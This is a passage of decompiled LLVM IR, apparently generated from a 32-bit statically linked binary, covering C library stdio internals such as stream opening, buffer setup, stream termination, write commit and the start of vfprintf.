  %v1_805bce7 = and i32 %v0_805bce7, 32768
  %v2_805bced = or i32 %v1_805bce7, %v0_805bced
  store i32 %v2_805bced, i32* @ebx, align 4
  br label %dec_label_pc_805bd15

dec_label_pc_805bcf1:                             ; preds = %dec_label_pc_805bca4
  %v11_805bcf3 = or i32 %v2_805bcf7, 32768
  store i32 %v11_805bcf3, i32* %eax.global-to-local, align 4
  %v1_805bcf6 = add i32 %arg4, 1
  %v8_805bcf6 = icmp eq i32 %v1_805bcf6, 0
  store i32 %v1_805bcf6, i32* @edi, align 4
  %v1_805bcf7 = icmp eq i1 %v8_805bcf6, false
  %v4_805bcf7 = select i1 %v1_805bcf7, i32 %v11_805bcf3, i32 %v2_805bcf7
  store i32 %v4_805bcf7, i32* @ebx, align 4
  store i32 %v4_805bcf7, i32* %stack_var_-72, align 4
  %v0_805bd01 = load i32, i32* @esi, align 4
  store i32 %v0_805bd01, i32* %stack_var_-76, align 4
  %v3_805bd02 = trunc i32 %v4_805bcf7 to i8
  %v4_805bd02 = call i32 @__libc_open(i32 %v0_805bd01, i8 %v3_805bd02, i32 438)
  store i32 %v4_805bd02, i32* %eax.global-to-local, align 4
  %v2_805bd0a = icmp slt i32 %v4_805bd02, 0
  %v1_805bd0c = load i32, i32* @ebp, align 4
  %v2_805bd0c = add i32 %v1_805bd0c, 4
  %v3_805bd0c = inttoptr i32 %v2_805bd0c to i32*
  store i32 %v4_805bd02, i32* %v3_805bd0c, align 4
  br i1 %v2_805bd0a, label %dec_label_pc_805bc39, label %dec_label_pc_805bd15

dec_label_pc_805bd15:                             ; preds = %dec_label_pc_805bcf1, %dec_label_pc_805bce7
  %v0_805bd15 = load i32, i32* @ebp, align 4
  %v1_805bd15 = inttoptr i32 %v0_805bd15 to i32*
  %v2_805bd15 = load i32, i32* %v1_805bd15, align 4
  %v2_805bd15.tr = trunc i32 %v2_805bd15 to i16
  %v1_805bd1d = and i16 %v2_805bd15.tr, 8192
  %v3_805bd1d = inttoptr i32 %v0_805bd15 to i16*
  store i16 %v1_805bd1d, i16* %v3_805bd1d, align 2
  %v0_805bd21 = load i32, i32* @ebx, align 4
  store i32 %v0_805bd21, i32* %eax.global-to-local, align 4
  %v1_805bd23 = and i32 %v0_805bd21, -31744
  %v0_805bd29 = load i32, i32* @ebp, align 4
  %v1_805bd29 = inttoptr i32 %v0_805bd29 to i32*
  %v2_805bd29 = load i32, i32* %v1_805bd29, align 4
  %v1_805bd2c = mul i32 %v0_805bd21, 16
  %v1_805bd2f = and i32 %v1_805bd2c, 48
  %v1_805bd30 = add nuw nsw i32 %v1_805bd2f, 16
  %v2_805bd33 = xor i32 %v1_805bd30, 48
  %v2_805bd36 = or i32 %v2_805bd29, %v1_805bd23
  %v2_805bd38 = or i32 %v2_805bd36, %v2_805bd33
  store i32 %v2_805bd38, i32* %eax.global-to-local, align 4
  %v1_805bd3a = trunc i32 %v2_805bd38 to i16
  %v3_805bd3a = inttoptr i32 %v0_805bd29 to i16*
  store i16 %v1_805bd3a, i16* %v3_805bd3a, align 2
  %v0_805bd3e = load i32, i32* %stack_var_-76, align 4
  %v1_805bd3e = call i32 @__errno_location(i32 %v0_805bd3e)
  store i32 %v1_805bd3e, i32* %eax.global-to-local, align 4
  %v0_805bd46 = load i32, i32* @ebp, align 4
  %v1_805bd46 = inttoptr i32 %v0_805bd46 to i16*
  %v2_805bd46 = load i16, i16* %v1_805bd46, align 2
  %v3_805bd46 = zext i16 %v2_805bd46 to i32
  store i32 %v3_805bd46, i32* @ebx, align 4
  %v1_805bd4a = inttoptr i32 %v1_805bd3e to i32*
  %v2_805bd4a = load i32, i32* %v1_805bd4a, align 4
  store i32 %v2_805bd4a, i32* @edi, align 4
  store i32 %v1_805bd3e, i32* @esi, align 4
  %v1_805bd4e = add i32 %v0_805bd46, 4
  %v2_805bd4e = inttoptr i32 %v1_805bd4e to i32*
  %v3_805bd4e = load i32, i32* %v2_805bd4e, align 4
  store i32 %v3_805bd4e, i32* %stack_var_-76, align 4
  %v1_805bd51 = call i32 @isatty(i32 %v3_805bd4e)
  %v2_805bd59 = mul i32 %v1_805bd51, 256
  store i32 %v2_805bd59, i32* %eax.global-to-local, align 4
  %v0_805bd5c = load i32, i32* @ebx, align 4
  %v2_805bd5c = or i32 %v0_805bd5c, %v2_805bd59
  store i32 %v2_805bd5c, i32* @ebx, align 4
  %v1_805bd5e = trunc i32 %v2_805bd5c to i16
  %v2_805bd5e = load i32, i32* @ebp, align 4
  %v3_805bd5e = inttoptr i32 %v2_805bd5e to i16*
  store i16 %v1_805bd5e, i16* %v3_805bd5e, align 2
  %v0_805bd62 = load i32, i32* @edi, align 4
  %v1_805bd62 = load i32, i32* @esi, align 4
  %v2_805bd62 = inttoptr i32 %v1_805bd62 to i32*
  store i32 %v0_805bd62, i32* %v2_805bd62, align 4
  %v0_805bd64 = load i32, i32* @ebp, align 4
  %v1_805bd64 = add i32 %v0_805bd64, 8
  %v2_805bd64 = inttoptr i32 %v1_805bd64 to i32*
  %v3_805bd64 = load i32, i32* %v2_805bd64, align 4
  %v4_805bd64 = icmp eq i32 %v3_805bd64, 0
  %v1_805bd68 = icmp eq i1 %v4_805bd64, false
  br i1 %v1_805bd68, label %dec_label_pc_805bd9c, label %dec_label_pc_805bd6a

dec_label_pc_805bd6a:                             ; preds = %dec_label_pc_805bd15
  store i32 4096, i32* %stack_var_-76, align 4
  %v1_805bd72 = call i32 @malloc(i32 4096)
  store i32 %v1_805bd72, i32* %eax.global-to-local, align 4
  %v1_805bd7a = icmp eq i32 %v1_805bd72, 0
  %v1_805bd7c = load i32, i32* @ebp, align 4
  %v2_805bd7c = add i32 %v1_805bd7c, 8
  %v3_805bd7c = inttoptr i32 %v2_805bd7c to i32*
  store i32 %v1_805bd72, i32* %v3_805bd7c, align 4
  br i1 %v1_805bd7a, label %dec_label_pc_805bd95, label %dec_label_pc_805bd81

dec_label_pc_805bd81:                             ; preds = %dec_label_pc_805bd6a
  %v1_805bd81 = add i32 %v1_805bd72, 4096
  store i32 %v1_805bd81, i32* %eax.global-to-local, align 4
  %v1_805bd86 = load i32, i32* @ebp, align 4
  %v2_805bd86 = add i32 %v1_805bd86, 12
  %v3_805bd86 = inttoptr i32 %v2_805bd86 to i32*
  store i32 %v1_805bd81, i32* %v3_805bd86, align 4
  %v0_805bd89 = load i32, i32* @ebp, align 4
  %v1_805bd89 = inttoptr i32 %v0_805bd89 to i32*
  %v2_805bd89 = load i32, i32* %v1_805bd89, align 4
  %v1_805bd8c = udiv i32 %v2_805bd89, 256
  %v3_805bd8c = and i32 %v1_805bd8c, 191
  %v8_805bd8c = or i32 %v3_805bd8c, 64
  %v10_805bd8c = mul nuw nsw i32 %v8_805bd8c, 256
  %v11_805bd8c = and i32 %v2_805bd89, -65281
  %v12_805bd8c = or i32 %v10_805bd8c, %v11_805bd8c
  store i32 %v12_805bd8c, i32* %eax.global-to-local, align 4
  %v1_805bd8f = trunc i32 %v12_805bd8c to i16
  %v3_805bd8f = inttoptr i32 %v0_805bd89 to i16*
  store i16 %v1_805bd8f, i16* %v3_805bd8f, align 2
  br label %dec_label_pc_805bd9c

dec_label_pc_805bd95:                             ; preds = %dec_label_pc_805bd6a
  %v0_805bd95 = load i32, i32* @ebp, align 4
  %v1_805bd95 = add i32 %v0_805bd95, 12
  %v2_805bd95 = inttoptr i32 %v1_805bd95 to i32*
  store i32 0, i32* %v2_805bd95, align 4
  br label %dec_label_pc_805bd9c

dec_label_pc_805bd9c:                             ; preds = %dec_label_pc_805bd15, %dec_label_pc_805bd81, %dec_label_pc_805bd95
  %v0_805bd9c = load i32, i32* @ebp, align 4
  %v1_805bd9c = add i32 %v0_805bd9c, 8
  %v2_805bd9c = inttoptr i32 %v1_805bd9c to i32*
  %v3_805bd9c = load i32, i32* %v2_805bd9c, align 4
  store i32 %v3_805bd9c, i32* %eax.global-to-local, align 4
  %v1_805bd9f = add i32 %v0_805bd9c, 2
  %v2_805bd9f = inttoptr i32 %v1_805bd9f to i8*
  store i8 0, i8* %v2_805bd9f, align 1
  %v0_805bda3 = load i32, i32* @ebp, align 4
  %v1_805bda3 = add i32 %v0_805bda3, 44
  %v2_805bda3 = inttoptr i32 %v1_805bda3 to i32*
  store i32 0, i32* %v2_805bda3, align 4
  %v0_805bdaa = load i32, i32* @ebp, align 4
  %v1_805bdaa = add i32 %v0_805bdaa, 1
  %v2_805bdaa = inttoptr i32 %v1_805bdaa to i8*
  %v3_805bdaa = load i8, i8* %v2_805bdaa, align 1
  %v4_805bdaa = and i8 %v3_805bdaa, 32
  %v5_805bdaa = icmp eq i8 %v4_805bdaa, 0
  %v0_805bdae = load i32, i32* %eax.global-to-local, align 4
  %v2_805bdae = add i32 %v0_805bdaa, 24
  %v3_805bdae = inttoptr i32 %v2_805bdae to i32*
  store i32 %v0_805bdae, i32* %v3_805bdae, align 4
  %v0_805bdb1 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bdb1 = load i32, i32* @ebp, align 4
  %v2_805bdb1 = add i32 %v1_805bdb1, 28
  %v3_805bdb1 = inttoptr i32 %v2_805bdb1 to i32*
  store i32 %v0_805bdb1, i32* %v3_805bdb1, align 4
  %v0_805bdb4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bdb4 = load i32, i32* @ebp, align 4
  %v2_805bdb4 = add i32 %v1_805bdb4, 16
  %v3_805bdb4 = inttoptr i32 %v2_805bdb4 to i32*
  store i32 %v0_805bdb4, i32* %v3_805bdb4, align 4
  %v0_805bdb7 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bdb7 = load i32, i32* @ebp, align 4
  %v2_805bdb7 = add i32 %v1_805bdb7, 20
  %v3_805bdb7 = inttoptr i32 %v2_805bdb7 to i32*
  store i32 %v0_805bdb7, i32* %v3_805bdb7, align 4
  %v0_805bdba = load i32, i32* @global_var_8074db0.665, align 16
  store i32 %v0_805bdba, i32* %eax.global-to-local, align 4
  %v1_805bdbf = load i32, i32* @ebp, align 4
  %v2_805bdbf = add i32 %v1_805bdbf, 52
  %v3_805bdbf = inttoptr i32 %v2_805bdbf to i32*
  store i32 %v0_805bdba, i32* %v3_805bdbf, align 4
  br i1 %v5_805bdaa, label %dec_label_pc_805be31, label %dec_label_pc_805bdc4

dec_label_pc_805bdc4:                             ; preds = %dec_label_pc_805bd9c
  store i32 134586897, i32* %stack_var_-72, align 4
  %v2_805bdcf = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805bdcf, i32* @esi, align 4
  store i32 %v2_805bdcf, i32* %stack_var_-76, align 4
  %v4_805bdd4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-32, i32 134586897, i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  store i32 %v4_805bdd4, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074d98.680 to i32), i32* %stack_var_-76, align 4
  %v1_805bde0 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  store i32 %v1_805bde0, i32* %eax.global-to-local, align 4
  store i32 134586897, i32* %stack_var_-72, align 4
  %v2_805bdf2 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_805bdf2, i32* @ebx, align 4
  store i32 %v2_805bdf2, i32* %stack_var_-76, align 4
  %v4_805bdf7 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-48, i32 134586897, i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  store i32 %v4_805bdf7, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8074d80.691 to i32), i32* %stack_var_-76, align 4
  %v1_805be03 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  %v0_805be08 = load i32, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  store i32 %v0_805be08, i32* %eax.global-to-local, align 4
  %v1_805be0d = load i32, i32* @ebp, align 4
  %v2_805be0d = add i32 %v1_805be0d, 32
  %v3_805be0d = inttoptr i32 %v2_805be0d to i32*
  store i32 %v0_805be08, i32* %v3_805be0d, align 4
  %v2_805be10 = load i32, i32* %stack_var_-76, align 4
  store i32 %v2_805be10, i32* @ecx, align 4
  %v0_805be11 = load i32, i32* @ebp, align 4
  store i32 %v0_805be11, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  %v2_805be17 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_805be17, i32* @edi, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805bdf2, i32* %stack_var_-76, align 4
  %v3_805be1b = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-48, i32 1)
  store i32 %v2_805bdf2, i32* %eax.global-to-local, align 4
  store i32 1, i32* %stack_var_-72, align 4
  store i32 %v2_805bdcf, i32* %stack_var_-76, align 4
  %v3_805be25 = call i32 @__pthread_cleanup_pop_restore(i32* nonnull %stack_var_-32, i32 1)
  br label %dec_label_pc_805be2a

dec_label_pc_805be2a:                             ; preds = %dec_label_pc_805bc43, %dec_label_pc_805bdc4
  %storemerge = phi i32 [ %v3_805be25, %dec_label_pc_805bdc4 ], [ %v1_805bc49, %dec_label_pc_805bc43 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805be31

dec_label_pc_805be2f:                             ; preds = %dec_label_pc_805bc39, %dec_label_pc_805bc26
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_805be31

dec_label_pc_805be31:                             ; preds = %dec_label_pc_805bd9c, %dec_label_pc_805bc72, %dec_label_pc_805be2a, %dec_label_pc_805be2f
  %v0_805be34 = load i32, i32* @ebp, align 4
  store i32 %v0_805be34, i32* %eax.global-to-local, align 4
  %v2_805be36 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805be36, i32* @ebx, align 4
  store i32 %v0_805bbfa, i32* @esi, align 4
  store i32 %v0_805bbf9, i32* @edi, align 4
  store i32 %v0_805bbf8, i32* @ebp, align 4
  ret i32 %v0_805be34

; uselistorder directives
  uselistorder i32 %v2_805bd89, { 1, 0 }
  uselistorder i32 %v1_805bd72, { 0, 2, 1, 3 }
  uselistorder i32 %v2_805bd59, { 1, 0 }
  uselistorder i32 %v1_805bd3e, { 1, 0, 2 }
  uselistorder i32 %v11_805bcf3, { 1, 0 }
  uselistorder i32 %v1_805bcc5, { 1, 0 }
  uselistorder i32 %v0_805bcc1, { 1, 0 }
  uselistorder i32 %v2_805bcf7, { 1, 0, 2 }
  uselistorder i32 %v1_805bc77, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %stack_var_-76, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13, 14 }
  uselistorder i32* %eax.global-to-local, { 1, 31, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 0, 29, 30 }
  uselistorder i32 191, { 0, 2, 1 }
  uselistorder i32 (i32, i8, i32)* @__libc_open, { 2, 0, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_fcntl, { 0, 2, 1 }
  uselistorder i32 %arg4, { 0, 4, 3, 2, 1, 5 }
  uselistorder label %dec_label_pc_805be31, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_805be2a, { 1, 0 }
  uselistorder label %dec_label_pc_805bd9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805bce7, { 1, 0 }
  uselistorder label %dec_label_pc_805bca4, { 1, 0 }
  uselistorder label %dec_label_pc_805bc6e, { 1, 0 }
  uselistorder label %dec_label_pc_805bc55, { 2, 0, 1 }
}

define i32 @__stdio_init_mutex(i32 %arg1) local_unnamed_addr {
entry:
  %v3_805bead = inttoptr i32 %arg1 to i16*
  %v4_805bead = call i32 @memcpy(i16* %v3_805bead, i32 ptrtoint (i32* @global_var_806d9f4.692 to i32), i32 24)
  ret i32 %v4_805bead
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_805beb6 = load i32, i32* @esi, align 4
  %v0_805beb7 = load i32, i32* @ebx, align 4
  store i32 %v0_805beb7, i32* %stack_var_-8, align 4
  %v2_805bec0 = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8074d80.691 to i32))
  store i32 %v2_805bec0, i32* %eax.global-to-local, align 4
  %v2_805becc = call i32 @__stdio_init_mutex(i32 ptrtoint (i32* @global_var_8074d98.680 to i32))
  store i32 %v2_805becc, i32* %eax.global-to-local, align 4
  %storemerge22 = load i32, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  store i32 %storemerge22, i32* @ebx, align 4
  %v1_805bf1623 = icmp eq i32 %storemerge22, 0
  %v1_805bf1825 = icmp eq i1 %v1_805bf1623, false
  br i1 %v1_805bf1825, label %dec_label_pc_805bed9.lr.ph, label %dec_label_pc_805bf36.preheader

dec_label_pc_805bed9.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805bed9

dec_label_pc_805bed9:                             ; preds = %dec_label_pc_805bed9.lr.ph, %dec_label_pc_805bf00
  %storemerge26 = phi i32 [ %storemerge22, %dec_label_pc_805bed9.lr.ph ], [ %storemerge, %dec_label_pc_805bf00 ]
  %v1_805bedc = add i32 %storemerge26, 56
  store i32 %v1_805bedc, i32* @esi, align 4
  %v2_805bee0 = call i32 @pthread_mutex_trylock(i32 %v1_805bedc)
  store i32 %v2_805bee0, i32* %eax.global-to-local, align 4
  %v1_805bee8 = icmp eq i32 %v2_805bee0, 0
  br i1 %v1_805bee8, label %dec_label_pc_805bf00, label %dec_label_pc_805beec

dec_label_pc_805beec:                             ; preds = %dec_label_pc_805bed9
  %v0_805beec = load i32, i32* @ebx, align 4
  %v1_805beec = add i32 %v0_805beec, 8
  %v2_805beec = inttoptr i32 %v1_805beec to i32*
  %v3_805beec = load i32, i32* %v2_805beec, align 4
  store i32 %v3_805beec, i32* %eax.global-to-local, align 4
  %v1_805beef = inttoptr i32 %v0_805beec to i16*
  store i16 48, i16* %v1_805beef, align 2
  %v0_805bef4 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bef4 = load i32, i32* @ebx, align 4
  %v2_805bef4 = add i32 %v1_805bef4, 24
  %v3_805bef4 = inttoptr i32 %v2_805bef4 to i32*
  store i32 %v0_805bef4, i32* %v3_805bef4, align 4
  %v0_805bef7 = load i32, i32* %eax.global-to-local, align 4
  %v1_805bef7 = load i32, i32* @ebx, align 4
  %v2_805bef7 = add i32 %v1_805bef7, 28
  %v3_805bef7 = inttoptr i32 %v2_805bef7 to i32*
  store i32 %v0_805bef7, i32* %v3_805bef7, align 4
  %v0_805befa = load i32, i32* %eax.global-to-local, align 4
  %v1_805befa = load i32, i32* @ebx, align 4
  %v2_805befa = add i32 %v1_805befa, 16
  %v3_805befa = inttoptr i32 %v2_805befa to i32*
  store i32 %v0_805befa, i32* %v3_805befa, align 4
  %v0_805befd = load i32, i32* %eax.global-to-local, align 4
  %v1_805befd = load i32, i32* @ebx, align 4
  %v2_805befd = add i32 %v1_805befd, 20
  %v3_805befd = inttoptr i32 %v2_805befd to i32*
  store i32 %v0_805befd, i32* %v3_805befd, align 4
  br label %dec_label_pc_805bf00

dec_label_pc_805bf00:                             ; preds = %dec_label_pc_805bed9, %dec_label_pc_805beec
  %v0_805bf03 = load i32, i32* @ebx, align 4
  %v1_805bf03 = add i32 %v0_805bf03, 52
  %v2_805bf03 = inttoptr i32 %v1_805bf03 to i32*
  store i32 1, i32* %v2_805bf03, align 4
  %v0_805bf0a = load i32, i32* @esi, align 4
  %v2_805bf0b = call i32 @__stdio_init_mutex(i32 %v0_805bf0a)
  store i32 %v2_805bf0b, i32* %eax.global-to-local, align 4
  %v0_805bf10 = load i32, i32* @ebx, align 4
  %v1_805bf10 = add i32 %v0_805bf10, 32
  %v2_805bf10 = inttoptr i32 %v1_805bf10 to i32*
  %storemerge = load i32, i32* %v2_805bf10, align 4
  store i32 %storemerge, i32* @ebx, align 4
  %v1_805bf16 = icmp eq i32 %storemerge, 0
  %v1_805bf18 = icmp eq i1 %v1_805bf16, false
  br i1 %v1_805bf18, label %dec_label_pc_805bed9, label %dec_label_pc_805bf13.dec_label_pc_805bf36.preheader_crit_edge

dec_label_pc_805bf13.dec_label_pc_805bf36.preheader_crit_edge: ; preds = %dec_label_pc_805bf00
  %storemerge23.pre = load i32, i32* bitcast (i32** @global_var_8074d7c.667 to i32*), align 4
  br label %dec_label_pc_805bf36.preheader

dec_label_pc_805bf36.preheader:                   ; preds = %dec_label_pc_805bf13.dec_label_pc_805bf36.preheader_crit_edge, %entry
  %storemerge23 = phi i32 [ %storemerge23.pre, %dec_label_pc_805bf13.dec_label_pc_805bf36.preheader_crit_edge ], [ %storemerge22, %entry ]
  store i32 %storemerge23, i32* @ebx, align 4
  %v1_805bf364 = icmp eq i32 %storemerge23, 0
  %v1_805bf3811 = icmp eq i1 %v1_805bf364, false
  br i1 %v1_805bf3811, label %dec_label_pc_805bf22.preheader, label %dec_label_pc_805bf3a

dec_label_pc_805bf22.preheader:                   ; preds = %dec_label_pc_805bf36.preheader
  br label %dec_label_pc_805bf22

dec_label_pc_805bf22:                             ; preds = %dec_label_pc_805bf22.preheader, %dec_label_pc_805bf33
  %v0_805bf2a = phi i32 [ %storemerge2, %dec_label_pc_805bf33 ], [ %storemerge23, %dec_label_pc_805bf22.preheader ]
  %v1_805bf22 = inttoptr i32 %v0_805bf2a to i8*
  %v2_805bf22 = load i8, i8* %v1_805bf22, align 1
  %v3_805bf22 = and i8 %v2_805bf22, 64
  %v4_805bf22 = icmp eq i8 %v3_805bf22, 0
  br i1 %v4_805bf22, label %dec_label_pc_805bf33, label %dec_label_pc_805bf27

dec_label_pc_805bf27:                             ; preds = %dec_label_pc_805bf22
  %v2_805bf2b = call i32 @__stdio_wcommit(i32 %v0_805bf2a)
  store i32 %v2_805bf2b, i32* %eax.global-to-local, align 4
  %v0_805bf33.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_805bf33

dec_label_pc_805bf33:                             ; preds = %dec_label_pc_805bf22, %dec_label_pc_805bf27
  %v0_805bf33 = phi i32 [ %v0_805bf2a, %dec_label_pc_805bf22 ], [ %v0_805bf33.pre, %dec_label_pc_805bf27 ]
  %v1_805bf33 = add i32 %v0_805bf33, 32
  %v2_805bf33 = inttoptr i32 %v1_805bf33 to i32*
  %storemerge2 = load i32, i32* %v2_805bf33, align 4
  store i32 %storemerge2, i32* @ebx, align 4
  %v1_805bf36 = icmp eq i32 %storemerge2, 0
  %v1_805bf38 = icmp eq i1 %v1_805bf36, false
  br i1 %v1_805bf38, label %dec_label_pc_805bf22, label %dec_label_pc_805bf3a

dec_label_pc_805bf3a:                             ; preds = %dec_label_pc_805bf33, %dec_label_pc_805bf36.preheader
  %v2_805bf3a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805bf3a, i32* %eax.global-to-local, align 4
  %v2_805bf3b = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805bf3b, i32* @ebx, align 4
  store i32 %v0_805beb6, i32* @esi, align 4
  ret i32 %v2_805bf3a

; uselistorder directives
  uselistorder i32 %storemerge2, { 1, 2, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_init_mutex, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_805bf33, { 1, 0 }
  uselistorder label %dec_label_pc_805bf22, { 1, 0 }
  uselistorder label %dec_label_pc_805bf00, { 1, 0 }
  uselistorder label %dec_label_pc_805bed9, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-12, align 4
  %v0_805bf40 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_805bf48 = add i32 %arg1, 8
  %v2_805bf48 = inttoptr i32 %v1_805bf48 to i32*
  %v3_805bf48 = load i32, i32* %v2_805bf48, align 4
  store i32 %v3_805bf48, i32* %edx.global-to-local, align 4
  %v1_805bf4b = add i32 %arg1, 16
  %v2_805bf4b = inttoptr i32 %v1_805bf4b to i32*
  %v3_805bf4b = load i32, i32* %v2_805bf4b, align 4
  %v2_805bf4e = sub i32 %v3_805bf4b, %v3_805bf48
  %v12_805bf4e = icmp eq i32 %v2_805bf4e, 0
  store i32 %v2_805bf4e, i32* %eax.global-to-local, align 4
  br i1 %v12_805bf4e, label %dec_label_pc_805bf61, label %dec_label_pc_805bf52

dec_label_pc_805bf52:                             ; preds = %entry
  store i32 %v3_805bf48, i32* %v2_805bf4b, align 4
  %v0_805bf55 = load i32, i32* @ecx, align 4
  %v0_805bf56 = load i32, i32* %eax.global-to-local, align 4
  %v0_805bf57 = load i32, i32* %edx.global-to-local, align 4
  %v0_805bf58 = load i32, i32* @ebx, align 4
  %v4_805bf59 = inttoptr i32 %v0_805bf58 to i16*
  %v5_805bf59 = call i32 @__stdio_WRITE(i16* %v4_805bf59, i32 %v0_805bf57, i32 %v0_805bf56, i32 %v0_805bf55)
  store i32 %v5_805bf59, i32* %eax.global-to-local, align 4
  %v0_805bf61.pre = load i32, i32* @ebx, align 4
  %v2_805bf67.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_805bf61

dec_label_pc_805bf61:                             ; preds = %entry, %dec_label_pc_805bf52
  %v2_805bf67 = phi i32 [ %tmp11, %entry ], [ %v2_805bf67.pre, %dec_label_pc_805bf52 ]
  %v0_805bf61 = phi i32 [ %arg1, %entry ], [ %v0_805bf61.pre, %dec_label_pc_805bf52 ]
  %v1_805bf61 = add i32 %v0_805bf61, 16
  %v2_805bf61 = inttoptr i32 %v1_805bf61 to i32*
  %v3_805bf61 = load i32, i32* %v2_805bf61, align 4
  store i32 %v3_805bf61, i32* %eax.global-to-local, align 4
  %v2_805bf64 = add i32 %v0_805bf61, 8
  %v3_805bf64 = inttoptr i32 %v2_805bf64 to i32*
  %v4_805bf64 = load i32, i32* %v3_805bf64, align 4
  %v5_805bf64 = sub i32 %v3_805bf61, %v4_805bf64
  store i32 %v5_805bf64, i32* %eax.global-to-local, align 4
  store i32 %v2_805bf67, i32* @edx, align 4
  store i32 %v0_805bf40, i32* @ebx, align 4
  ret i32 %v5_805bf64

; uselistorder directives
  uselistorder i32 %v0_805bf61, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_805bf61, { 1, 0 }
}

define i32 @__GI_vfprintf(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v0_805bf6c = load i32, i32* @edi, align 4
  %v0_805bf6d = load i32, i32* @esi, align 4
  %v0_805bf6e = load i32, i32* @ebx, align 4
  %v4_805bf72 = ptrtoint i16* %arg1 to i32
  store i32 %v4_805bf72, i32* @esi, align 4
  %v1_805bf76 = add i32 %v4_805bf72, 52
  %v2_805bf76 = inttoptr i32 %v1_805bf76 to i32*
  %v3_805bf76 = load i32, i32* %v2_805bf76, align 4
  store i32 %v3_805bf76, i32* @edi, align 4
  %v1_805bf79 = icmp eq i32 %v3_805bf76, 0
  %v1_805bf7b = icmp eq i1 %v1_805bf79, false
  br i1 %v1_805bf7b, label %dec_label_pc_805bf9c, label %dec_label_pc_805bf7d

dec_label_pc_805bf7d:                             ; preds = %entry
  %v1_805bf7d = add i32 %v4_805bf72, 56
  store i32 %v1_805bf7d, i32* @ebx, align 4
  %v5_805bf8c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-28, i32 134586897, i32 %v1_805bf7d)
  %v0_805bf91 = load i32, i32* @ebx, align 4
  %v2_805bf94 = call i32 @pthread_mutex_lock(i32 %v0_805bf91)
  %v0_805bf9c.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805bf9c

dec_label_pc_805bf9c:                             ; preds = %entry, %dec_label_pc_805bf7d
  %v0_805bfb5 = phi i32 [ %v4_805bf72, %entry ], [ %v0_805bf9c.pre, %dec_label_pc_805bf7d ]
  %v1_805bf9c = inttoptr i32 %v0_805bfb5 to i16*
  %v2_805bf9c = load i16, i16* %v1_805bf9c, align 2
  %v1_805bf9f = and i16 %v2_805bf9c, 192
  %v6_805bfa4 = icmp eq i16 %v1_805bf9f, 192
  br i1 %v6_805bfa4, label %dec_label_pc_805bf9c.dec_label_pc_805bfc2_crit_edge, label %dec_label_pc_805bfab

dec_label_pc_805bf9c.dec_label_pc_805bfc2_crit_edge: ; preds = %dec_label_pc_805bf9c
  br label %dec_label_pc_805bfc2

dec_label_pc_805bfab:                             ; preds = %dec_label_pc_805bf9c
  %v0_805bfab = load i32, i32* @ecx, align 4
  store i32 -1, i32* @ebx, align 4
  %v6_805bfb6 = call i32 @__stdio_trans2w_o(i16* %v1_805bf9c, i32 128, i32 %v0_805bfab, i32 %v0_805bfab)
  %v1_805bfbe = icmp eq i32 %v6_805bfb6, 0
  %v1_805bfc0 = icmp eq i1 %v1_805bfbe, false
  br i1 %v1_805bfc0, label %dec_label_pc_805bfd6, label %dec_label_pc_805bfab.dec_label_pc_805bfc2_crit_edge

dec_label_pc_805bfab.dec_label_pc_805bfc2_crit_edge: ; preds = %dec_label_pc_805bfab
